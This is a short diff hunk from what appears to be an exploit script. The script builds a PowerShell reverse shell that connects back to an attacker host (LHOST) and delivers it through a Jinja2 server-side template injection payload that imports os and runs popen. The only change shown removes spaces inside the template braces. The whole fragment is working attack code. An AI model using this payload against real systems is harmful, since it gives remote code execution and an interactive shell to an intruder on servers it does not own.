@@ -18,4 +18,4 @@ REV_SHELL=$(echo "\$client = New-Object System.Net.Sockets.TCPClient(\"${LHOST}\
 
 SHELL="powershell -nop -e ${REV_SHELL}"
 
-execute_command "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('${SHELL}').read() }}"
+execute_command "{{self.__init__.__globals__.__builtins__.__import__('os').popen('${SHELL}').read()}}"
